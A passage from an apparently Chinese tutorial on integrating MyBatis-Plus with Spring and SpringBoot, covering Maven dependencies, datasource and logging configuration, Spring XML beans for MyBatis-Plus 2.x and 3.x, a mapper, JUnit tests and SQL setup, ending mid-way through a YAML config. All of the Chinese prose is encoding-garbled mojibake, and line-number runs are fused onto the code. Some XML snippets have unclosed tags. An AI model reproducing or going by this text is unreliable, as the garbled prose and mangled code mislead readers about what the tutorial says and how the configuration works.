çš„ä¾èµ–ï¼Œå¦åˆ™ä¼šå¼•èµ·ç‰ˆæœ¬å†²çªï¼Œè¿™æ˜¯å› ä¸º MyBatis-Plus ä¼šè‡ªåŠ¨ç»´æŠ¤å®ƒä»¬çš„ç‰ˆæœ¬ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;properties&gt; &lt;junit.version&gt;4.12&lt;/junit.version&gt; &lt;slf4j.version&gt;1.7.30&lt;/slf4j.version&gt; &lt;logback.version&gt;1.2.3&lt;/logback.version&gt; &lt;druid.version&gt;1.2.11&lt;/druid.version&gt; &lt;mybatis-plus.version&gt;3.5.2&lt;/mybatis-plus.version&gt; &lt;mysql-connector.version&gt;8.0.23&lt;/mysql-connector.version&gt; &lt;spring.version&gt;5.3.2&lt;/spring.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;!-- Junit --&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;${junit.version}&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- Druid è¿æ¥æ±  --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;${druid.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- MySQL é©±åŠ¨ --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;${mysql-connector.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- MyBatis-Plus --&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus&lt;/artifactId&gt; &lt;version&gt;${mybatis-plus.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Spring --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-test&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- æ—¥å¿— --&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;version&gt;${slf4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; &lt;artifactId&gt;logback-classic&lt;/artifactId&gt; &lt;version&gt;${logback.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»ºé¡¹ç›®é…ç½®æ–‡ä»¶æ•°æ®åº“é…ç½®æ–‡ä»¶åœ¨ /src/main/resources ç›®å½•ä¸‹åˆ›å»º db.properties é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­çš„é…ç½®å†…å®¹å¦‚ä¸‹ï¼š 1234567891011jdbc.user=rootjdbc.password=123456jdbc.url=jdbc:mysql://127.0.0.1:3306/mybatis_plus_lesson?characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false&amp;useUnicode=true&amp;useJDBCCompliantTimezoneShift=true&amp;useLegacyDatetimeCode=false&amp;serverTimezone=UTCjdbc.miniPoolSize=10jdbc.maxPoolSize=30jdbc.initialPoolSize=1jdbc.maxWait=60000jdbc.timeBetweenEvictionRunsMillis=60000jdbc.minEvictableIdleTimeMillis=300000jdbc.preferredTestQuery=select 1 Logback é…ç½®æ–‡ä»¶åœ¨ /src/main/resources ç›®å½•ä¸‹åˆ›å»º logback.xml é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­çš„é…ç½®å†…å®¹å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;configuration debug="false"&gt; &lt;!-- å®šä¹‰æ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨åœ°å€ --&gt; &lt;property name="LOG_HOME" value="/tmp/mybatis-plus/logs" /&gt; &lt;!-- æ§åˆ¶å°æ—¥å¿—è¾“å‡º --&gt; &lt;appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;encoder class="ch.qos.logback.classic.encoder.PatternLayoutEncoder"&gt; &lt;!-- æ ¼å¼åŒ–è¾“å‡ºï¼š%d è¡¨ç¤ºæ—¥æœŸï¼Œ%thread è¡¨ç¤ºçº¿ç¨‹åï¼Œ%-5levelï¼šè¡¨ç¤ºçº§åˆ«ä»å·¦æ˜¾ç¤º5ä¸ªå­—ç¬¦å®½åº¦ï¼Œ%msgï¼šè¡¨ç¤ºæ—¥å¿—æ¶ˆæ¯ï¼Œ%nï¼šè¡¨ç¤ºæ¢è¡Œç¬¦ --&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!-- MyBatis æ—¥å¿—æ‰“å° --&gt; &lt;logger name="com.apache.ibatis" level="TRACE" /&gt; &lt;logger name="java.sql.Connection" level="DEBUG" /&gt; &lt;logger name="java.sql.Statement" level="DEBUG" /&gt; &lt;logger name="java.sql.PreparedStatement" level="DEBUG" /&gt; &lt;!-- æ—¥å¿—è¾“å‡ºçº§åˆ« --&gt; &lt;root level="DEBUG"&gt; &lt;appender-ref ref="STDOUT" /&gt; &lt;/root&gt;&lt;/configuration&gt; MyBatis é…ç½®æ–‡ä»¶åœ¨ /src/main/resources ç›®å½•ä¸‹åˆ›å»º mybatis-config.xml é…ç½®æ–‡ä»¶ï¼Œç”¨äºå­˜æ”¾ MyBatis çš„å…¨å±€æ ¸å¿ƒé…ç½®ä¿¡æ¯ï¼Œå…¶ä¸­çš„é…ç½®å†…å®¹å¦‚ä¸‹ï¼š 12345678&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD Config 3.0//EN" "http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;&lt;configuration&gt;&lt;/configuration&gt; Spring é…ç½®æ–‡ä»¶åœ¨ /src/main/resources ç›®å½•ä¸‹åˆ›å»º application.xml é…ç½®æ–‡ä»¶ï¼ŒSpring æ•´åˆ MyBatis + MyBatis-Plus çš„æ ¸å¿ƒé…ç½®ä¿¡æ¯å°±å†™åœ¨é‡Œé¢ï¼ˆä¹Ÿå°±æ˜¯å®šä¹‰ SqlSessionFactoryBean çš„ Beanï¼‰ï¼Œå…¶ä¸­çš„é…ç½®å†…å®¹å¦‚ä¸‹ï¼š MyBatis-Plus 2.x ç‰ˆæœ¬é…ç½®æç¤º MyBatis-Plus 2.x çš„ Spring è¯¦ç»†é…ç½®å‚æ•°å¯çœ‹ è¿™é‡Œã€‚ å½“ä½¿ç”¨çš„ MyBatis-Plus ä¸º 2.x ç‰ˆæœ¬æ—¶ï¼ˆå¦‚ 2.3.3 ç‰ˆæœ¬ï¼‰ï¼Œå…·ä½“çš„é…ç½®å†…å®¹å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xmlns:mybatis-spring="http://mybatis.org/schema/mybatis-spring" xmlns:tx="http://www.springframework.org/schema/tx" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://mybatis.org/schema/mybatis-spring http://mybatis.org/schema/mybatis-spring-1.2.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd"&gt; &lt;!-- å¼•å…¥æ•°æ®åº“é…ç½®æ–‡ä»¶ --&gt; &lt;context:property-placeholder location="classpath:db.properties" /&gt; &lt;!-- æ•°æ®æº --&gt; &lt;bean id="dataSource" class="com.alibaba.druid.pool.DruidDataSource" init-method="init" destroy-method="close"&gt; &lt;property name="url" value="${jdbc.url}" /&gt; &lt;property name="username" value="${jdbc.user}" /&gt; &lt;property name="password" value="${jdbc.password}" /&gt; &lt;property name="maxActive" value="${jdbc.maxPoolSize}" /&gt; &lt;property name="initialSize" value="${jdbc.initialPoolSize}" /&gt; &lt;property name="maxWait" value="${jdbc.maxWait}" /&gt; &lt;property name="minIdle" value="${jdbc.miniPoolSize}" /&gt; &lt;property name="timeBetweenEvictionRunsMillis" value="${jdbc.timeBetweenEvictionRunsMillis}" /&gt; &lt;property name="minEvictableIdleTimeMillis" value="${jdbc.minEvictableIdleTimeMillis}" /&gt; &lt;property name="validationQuery" value="${jdbc.preferredTestQuery}" /&gt; &lt;property name="testWhileIdle" value="true" /&gt; &lt;property name="filters" value="stat" /&gt; &lt;/bean&gt; &lt;!-- äº‹åŠ¡ç®¡ç† --&gt; &lt;bean id="dataSourceTransactionManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager"&gt; &lt;property name="dataSource" ref="dataSource" /&gt; &lt;/bean&gt; &lt;!-- å¼€å¯åŸºäºæ³¨è§£çš„äº‹åŠ¡ --&gt; &lt;tx:annotation-driven transaction-manager="dataSourceTransactionManager" /&gt; &lt;!-- å®šä¹‰ SqlSessionFactory --&gt; &lt;bean id="sqlSessionFactory" class="com.baomidou.mybatisplus.spring.MybatisSqlSessionFactoryBean"&gt; &lt;!-- æ•°æ®æº --&gt; &lt;property name="dataSource" ref="dataSource" /&gt; &lt;!-- ç±»å‹åˆ«å --&gt; &lt;property name="typeAliasesPackage" value="com.clay.mybatis.bean" /&gt; &lt;!--æŒ‡å®š SQL æ˜ å°„æ–‡ä»¶çš„ä½ç½® --&gt; &lt;property name="mapperLocations" value="classpath*:mapper/**/*.xml" /&gt; &lt;!-- æŒ‡å®š MyBatis å…¨å±€é…ç½®æ–‡ä»¶çš„ä½ç½® --&gt; &lt;property name="configLocation" value="classpath:mybatis-config.xml" /&gt; &lt;!-- æ³¨å…¥ Mybatis-Plus çš„å…¨å±€é…ç½® --&gt; &lt;property name="globalConfig" ref="globalConfig"&gt;&lt;/property&gt; &lt;/bean&gt; &lt;!-- å®šä¹‰ Mybatis-Plus çš„å…¨å±€é…ç½® --&gt; &lt;bean id="globalConfig" class="com.baomidou.mybatisplus.entity.GlobalConfiguration"&gt; &lt;!-- æ•°æ®åº“è¡¨å­—æ®µåä¸ JavaBean å±æ€§åçš„é©¼å³°å‘½åæ˜ å°„ï¼Œåœ¨ 2.3 ç‰ˆæœ¬ä»¥åï¼Œé»˜è®¤å€¼æ˜¯ true --&gt; &lt;property name="dbColumnUnderline" value="true"&gt;&lt;/property&gt; &lt;!-- å…¨å±€çš„ä¸»é”®ç­–ç•¥ --&gt; &lt;property name="idType" value="0"&gt;&lt;/property&gt; &lt;!-- å…¨å±€çš„è¡¨å‰ç¼€ç­–ç•¥é…ç½® --&gt; &lt;property name="tablePrefix" value="t_"&gt;&lt;/property&gt; &lt;/bean&gt; &lt;!-- æ‰«æ Mapper æ¥å£ --&gt; &lt;bean class="org.mybatis.spring.mapper.MapperScannerConfigurer"&gt; &lt;property name="basePackage" value="com.clay.mybatis.dao" /&gt; &lt;/bean&gt;&lt;/beans&gt; æç¤º è‹¥ä¸å¸Œæœ›åœ¨é¡¹ç›®ä¸­å•ç‹¬åˆ›å»º MyBatis çš„å…¨å±€é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ MybatisConfiguration å®šä¹‰ MyBatis çš„åŸç”Ÿé…ç½®å†…å®¹ï¼Œè¿™æ ·å°±ä¸å†éœ€è¦åˆ›å»ºå¹¶æŒ‡å®š MyBatis çš„å…¨å±€é…ç½®æ–‡ä»¶äº†ï¼Œé…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š 123456789101112131415&lt;bean id="sqlSessionFactory" class="com.baomidou.mybatisplus.spring.MybatisSqlSessionFactoryBean"&gt; &lt;property name="configuration" ref="mybatisConfig"/&gt; &lt;property name="globalConfig" ref="globalConfig"/&gt; ...&lt;/bean&gt;&lt;bean id="mybatisConfig" class="com.baomidou.mybatisplus.MybatisConfiguration"&gt; &lt;!-- å¼€å¯è‡ªåŠ¨é©¼å³°å‘½åè§„åˆ™æ˜ å°„ --&gt; &lt;property name="mapUnderscoreToCamelCase" value="true"/&gt; ...&lt;/bean&gt;&lt;bean id="globalConfig" class="com.baomidou.mybatisplus.entity.GlobalConfiguration"&gt; ...&lt;/bean&gt; MyBatis-Plus 3.x ç‰ˆæœ¬é…ç½®æç¤º MyBatis-Plus 3.x çš„ Spring è¯¦ç»†é…ç½®å‚æ•°å¯çœ‹ è¿™é‡Œã€‚ å½“ä½¿ç”¨çš„ MyBatis-Plus ä¸º 3.x ç‰ˆæœ¬æ—¶ï¼ˆå¦‚ 3.5.2 ç‰ˆæœ¬ï¼‰ï¼Œå…·ä½“çš„é…ç½®å†…å®¹å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xmlns:mybatis-spring="http://mybatis.org/schema/mybatis-spring" xmlns:tx="http://www.springframework.org/schema/tx" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://mybatis.org/schema/mybatis-spring http://mybatis.org/schema/mybatis-spring-1.2.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd"&gt; &lt;!-- å¼•å…¥æ•°æ®åº“é…ç½®æ–‡ä»¶ --&gt; &lt;context:property-placeholder location="classpath:db.properties" /&gt; &lt;!-- æ•°æ®æº --&gt; &lt;bean id="dataSource" class="com.alibaba.druid.pool.DruidDataSource" init-method="init" destroy-method="close"&gt; &lt;property name="url" value="${jdbc.url}" /&gt; &lt;property name="username" value="${jdbc.user}" /&gt; &lt;property name="password" value="${jdbc.password}" /&gt; &lt;property name="maxActive" value="${jdbc.maxPoolSize}" /&gt; &lt;property name="initialSize" value="${jdbc.initialPoolSize}" /&gt; &lt;property name="maxWait" value="${jdbc.maxWait}" /&gt; &lt;property name="minIdle" value="${jdbc.miniPoolSize}" /&gt; &lt;property name="timeBetweenEvictionRunsMillis" value="${jdbc.timeBetweenEvictionRunsMillis}" /&gt; &lt;property name="minEvictableIdleTimeMillis" value="${jdbc.minEvictableIdleTimeMillis}" /&gt; &lt;property name="validationQuery" value="${jdbc.preferredTestQuery}" /&gt; &lt;property name="testWhileIdle" value="true" /&gt; &lt;property name="filters" value="stat" /&gt; &lt;/bean&gt; &lt;!-- äº‹åŠ¡ç®¡ç† --&gt; &lt;bean id="dataSourceTransactionManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager"&gt; &lt;property name="dataSource" ref="dataSource" /&gt; &lt;/bean&gt; &lt;!-- å¼€å¯åŸºäºæ³¨è§£çš„äº‹åŠ¡ --&gt; &lt;tx:annotation-driven transaction-manager="dataSourceTransactionManager" /&gt; &lt;!-- å®šä¹‰ SqlSessionFactory --&gt; &lt;bean id="sqlSessionFactory" class="com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean"&gt; &lt;!-- æ•°æ®æº --&gt; &lt;property name="dataSource" ref="dataSource" /&gt; &lt;!-- ç±»å‹åˆ«å --&gt; &lt;property name="typeAliasesPackage" value="com.clay.mybatis.bean" /&gt; &lt;!--æŒ‡å®š SQL æ˜ å°„æ–‡ä»¶çš„ä½ç½® --&gt; &lt;property name="mapperLocations" value="classpath*:mapper/**/*.xml" /&gt; &lt;!-- æŒ‡å®š MyBatis å…¨å±€é…ç½®æ–‡ä»¶çš„ä½ç½® --&gt; &lt;property name="configLocation" value="classpath:mybatis-config.xml" /&gt; &lt;!-- æ³¨å…¥ Mybatis-Plus çš„å…¨å±€é…ç½® --&gt; &lt;property name="globalConfig" ref="globalConfig"&gt;&lt;/property&gt; &lt;/bean&gt; &lt;!-- å®šä¹‰ Mybatis-Plus çš„å…¨å±€é…ç½® --&gt; &lt;bean id="globalConfig" class="com.baomidou.mybatisplus.core.config.GlobalConfig"&gt; &lt;property name="dbConfig" ref="dbConfig" /&gt; &lt;/bean&gt; &lt;!-- å®šä¹‰ Mybatis-Plus çš„æ•°æ®åº“é…ç½® --&gt; &lt;bean id="dbConfig" class="com.baomidou.mybatisplus.core.config.GlobalConfig.DbConfig"&gt; &lt;!-- å…¨å±€çš„ä¸»é”®ç­–ç•¥ --&gt; &lt;property name="idType" value="AUTO"&gt;&lt;/property&gt; &lt;!-- å…¨å±€çš„è¡¨å‰ç¼€ç­–ç•¥é…ç½® --&gt; &lt;property name="tablePrefix" value="t_"&gt;&lt;/property&gt; &lt;/bean&gt; &lt;!-- æ‰«æ Mapper æ¥å£ --&gt; &lt;bean class="org.mybatis.spring.mapper.MapperScannerConfigurer"&gt; &lt;property name="basePackage" value="com.clay.mybatis.dao" /&gt; &lt;/bean&gt;&lt;/beans&gt; æç¤º è‹¥ä¸å¸Œæœ›åœ¨é¡¹ç›®ä¸­å•ç‹¬åˆ›å»º MyBatis çš„å…¨å±€é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ MybatisConfiguration å®šä¹‰ MyBatis çš„åŸç”Ÿé…ç½®å†…å®¹ï¼Œè¿™æ ·å°±ä¸å†éœ€è¦åˆ›å»ºå¹¶æŒ‡å®š MyBatis çš„å…¨å±€é…ç½®æ–‡ä»¶äº†ï¼Œé…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š 12345678910111213141516171819202122&lt;bean id="sqlSessionFactory" class="com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean"&gt; &lt;property name="configuration" ref="configuration"/&gt; &lt;property name="globalConfig" ref="globalConfig"/&gt; ...&lt;/bean&gt;&lt;bean id="configuration" class="com.baomidou.mybatisplus.core.MybatisConfiguration"&gt; &lt;!-- å¼€å¯äºŒçº§ç¼“å­˜ --&gt; &lt;property name="cacheEnabled" value="true"&gt; &lt;!-- å¼€å¯è‡ªåŠ¨é©¼å³°å‘½åè§„åˆ™æ˜ å°„ --&gt; &lt;property name="mapUnderscoreToCamelCase" value="true"&gt; ...&lt;/bean&gt;&lt;bean id="globalConfig" class="com.baomidou.mybatisplus.core.config.GlobalConfig"&gt; &lt;property name="dbConfig" ref="dbConfig"/&gt; ...&lt;/bean&gt;&lt;bean id="dbConfig" class="com.baomidou.mybatisplus.core.config.GlobalConfig.DbConfig"&gt; ...&lt;/bean&gt; é€šç”¨ CRUD ä»£ç åœ¨é¡¹ç›®å¼€å‘ä¸­ï¼Œä½¿ç”¨ MyBatis ä¸ MyBatis-Plus ç¼–å†™ CRUD ä»£ç çš„åŒºåˆ«ï¼š åŸºäº Mybatis çš„æ–¹å¼ éœ€è¦ç¼–å†™ Mapper æ¥å£ï¼Œå¹¶æ‰‹åŠ¨ç¼–å†™ CRUD æ–¹æ³• æä¾› SQL æ˜ å°„æ–‡ä»¶ï¼Œå¹¶æ‰‹åŠ¨ç¼–å†™æ¯ä¸ª CRUD æ–¹æ³•å¯¹åº”çš„ SQL è¯­å¥ åŸºäº MyBatis-Plus çš„æ–¹å¼ ç®€å•çš„ CRUD ä¸šåŠ¡åªéœ€è¦åˆ›å»º Mapper æ¥å£ï¼Œå¹¶ç»§æ‰¿ BaseMapper æ¥å£ï¼Œè¿™å°±æ˜¯ä½¿ç”¨ MyBatis-Plus æ‰€éœ€è¦çš„æ“ä½œï¼Œç”šè‡³å¯ä»¥ä¸åˆ›å»º SQL æ˜ å°„æ–‡ä»¶ JavaBean ç±»123456789public class Employee { private Long id; private String lastName; private String gender; private String email; private Integer age;} Mapper æ¥å£12345public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; { public Employee getById(Long id);} SQL æ˜ å°„æ–‡ä»¶1234567891011121314&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getById" parameterType="Long" resultType="Employee"&gt; select id, last_name as lastName, gender, email, age from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; Junit å•å…ƒæµ‹è¯•ç±» æ–¹å¼ä¸€ï¼šé€šè¿‡ IOC å®¹å™¨æµ‹è¯• 1234567891011121314151617181920212223242526272829public class IocContainerTest { private static final ClassPathXmlApplicationContext iocContext = new ClassPathXmlApplicationContext("application.xml"); private static final EmployeeMapper empMapper = iocContext.getBean("employeeMapper", EmployeeMapper.class); @Test public void select() { Employee employee = empMapper.selectById(1L); Assert.notNull(employee, "entity not be null"); System.out.println(employee); } @Test public void insert() { Employee employee = new Employee("David", "1", "david@gmail.com", 23); Integer insertResult = empMapper.insert(employee); Assert.isTrue(insertResult &gt; 0, ""); System.out.println("insert result: " + insertResult); } @Test public void getById() { Employee employee = empMapper.getById(1L); Assert.notNull(employee, "entity not be null"); System.out.println(employee); }} æ–¹å¼äºŒï¼šé€šè¿‡ Spring + Junit æµ‹è¯• 123456789101112131415161718192021222324252627282930@RunWith(SpringRunner.class)@ContextConfiguration("classpath:application.xml")public class MyBatisPlusTest { @Autowired private EmployeeMapper empMapper; @Test public void select() { Employee employee = empMapper.selectById(1L); Assert.notNull(employee, "entity not be null"); System.out.println(employee); } @Test public void insert() { Employee employee = new Employee("David", "1", "david@gmail.com", 23); Integer insertResult = empMapper.insert(employee); Assert.isTrue(insertResult &gt; 0, ""); System.out.println("insert result: " + insertResult); } @Test public void getById() { Employee employee = empMapper.getById(1L); Assert.notNull(employee, "entity not be null"); System.out.println(employee); }} æ‰§è¡Œä¸Šè¿°çš„å•å…ƒæµ‹è¯•ä»£ç åï¼Œè‹¥æ§åˆ¶å°è¾“å‡ºä¸‹é¢ç±»ä¼¼çš„æ—¥å¿—ä¿¡æ¯ï¼Œåˆ™è¯´æ˜ Spring ä¸ MyBatis-Plus æ­£å¸¸å·¥ä½œã€‚ 12345678910111213142022-09-01 21:10:50.534 [main] DEBUG com.clay.mybatis.dao.EmployeeMapper.selectById - ==&gt; Preparing: SELECT id,last_name,gender,email,age FROM t_employee WHERE id=?2022-09-01 21:10:50.535 [main] DEBUG com.clay.mybatis.dao.EmployeeMapper.selectById - ==&gt; Parameters: 1(Long)2022-09-01 21:10:50.557 [main] DEBUG com.clay.mybatis.dao.EmployeeMapper.selectById - &lt;== Total: 1Employee [id=1, lastName=David, gender=1, email=david@gmail.com, age=23]2022-09-01 21:10:50.464 [main] DEBUG com.clay.mybatis.dao.EmployeeMapper.insert - ==&gt; Preparing: INSERT INTO t_employee ( last_name, gender, email, age ) VALUES ( ?, ?, ?, ? )2022-09-01 21:10:50.510 [main] DEBUG com.clay.mybatis.dao.EmployeeMapper.insert - ==&gt; Parameters: David(String), 1(String), david@gmail.com(String), 23(Integer)2022-09-01 21:10:50.514 [main] DEBUG com.clay.mybatis.dao.EmployeeMapper.insert - &lt;== Updates: 1insert result: 12022-09-01 21:10:50.562 [main] DEBUG com.clay.mybatis.dao.EmployeeMapper.getById - ==&gt; Preparing: select id, last_name as lastName, gender, email, age from t_employee where id = ?2022-09-01 21:10:50.563 [main] DEBUG com.clay.mybatis.dao.EmployeeMapper.getById - ==&gt; Parameters: 1(Long)2022-09-01 21:10:50.564 [main] DEBUG com.clay.mybatis.dao.EmployeeMapper.getById - &lt;== Total: 1Employee [id=1, lastName=David, gender=1, email=david@gmail.com, age=23] SpringBoot å¿«é€Ÿå¯åŠ¨æ¡ˆä¾‹æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-plus-lesson-02ã€‚ è½¯ä»¶ç‰ˆæœ¬è¯´æ˜ åç§° ç‰ˆæœ¬ Druid 1.2.11 SpringBoot 2.7.3 MyBatis-Plus 3.5.2 åˆå§‹åŒ–æ•°æ®åº“123456789101112CREATE DATABASE `mybatis_plus_lesson` DEFAULT CHARACTER SET utf8mb4;CREATE TABLE `t_employee` ( `id` int(11) NOT NULL AUTO_INCREMENT, `last_name` varchar(255) DEFAULT NULL, `gender` char(1) DEFAULT NULL, `email` varchar(255) DEFAULT NULL, `age` int DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;insert into t_employee(id, last_name, gender, email, age) values(1, \'Jim\',\'1\', \'jim@gmail.com\', 26), (2, \'Peter\',\'1\', \'peter@gmail.com\', 29); å¼•å…¥ Maven ä¾èµ–å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œä¸éœ€è¦å•ç‹¬å¼•å…¥ MyBatis ä¸ MyBatis-Spring çš„ä¾èµ–ï¼Œå¦åˆ™ä¼šå¼•èµ·ç‰ˆæœ¬å†²çªï¼Œè¿™æ˜¯å› ä¸º MyBatis-Plus ä¼šè‡ªåŠ¨ç»´æŠ¤å®ƒä»¬çš„ç‰ˆæœ¬ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;properties&gt; &lt;druid.version&gt;1.2.11&lt;/druid.version&gt; &lt;mybatis-plus.version&gt;3.5.2&lt;/mybatis-plus.version&gt;&lt;/properties&gt;&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.7.3&lt;/version&gt; &lt;relativePath /&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;!-- Junit --&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- SpringBoot --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- MySQL é©±åŠ¨ --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- Druid è¿æ¥æ±  --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${druid.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- MyBatis-Plus --&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;version&gt;${mybatis-plus.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; SpringBoot é…ç½®æ–‡ä»¶æç¤º SpringBoot 2.0ï¼ˆå†…ç½® jdbc5 é©±åŠ¨ï¼‰ï¼Œé©±åŠ¨ç±»ä½¿ç”¨çš„æ˜¯ driver-class-name: com.mysql.jdbc.Driver SpringBoot 2.1 åŠä»¥ä¸Šï¼ˆå†…ç½® jdbc8 é©±åŠ¨ï¼‰ï¼Œé©±åŠ¨ç±»ä½¿ç”¨çš„æ˜¯ driver-class-name: com.mysql.cj.jdbc.Driver MySQL 5.7 ç‰ˆæœ¬çš„ URL ä¸º jdbc:mysql://127.0.0.1:3306/mybatis_plus_lesson?characterEncoding=utf-8&amp;useSSL=false MySQL 8.0 ç‰ˆæœ¬çš„ URL ä¸º jdbc:mysql://127.0.0.1:3306/mybatis_plus?serverTimezone=GMT%2B8&amp;characterEncoding=utf-8&amp;useSSL=falseï¼Œè‹¥ä¸æŒ‡å®š serverTimezone=GMT%2B8 ä¼šå¯¼è‡´è¿æ¥ MySQL æ—¶æŠ›å‡ºå¼‚å¸¸ MyBatis-Plus 2.x ç‰ˆæœ¬é…ç½®æç¤º MyBatis-Plus 2.x çš„ SpringBoot è¯¦ç»†é…ç½®å‚æ•°å¯çœ‹ è¿™é‡Œã€‚ å½“ä½¿ç”¨çš„ MyBatis-Plus ä¸º 2.x ç‰ˆæœ¬æ—¶ï¼ˆå¦‚ 2.3.3 ç‰ˆæœ¬ï¼‰ï¼Œå…·ä½“çš„é…ç½®å†…å®¹å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354spring: # Druid æ•°æ®æºé…ç½® datasource: type: com.alibaba.druid.pool.DruidDataSource druid: driver-class-name: 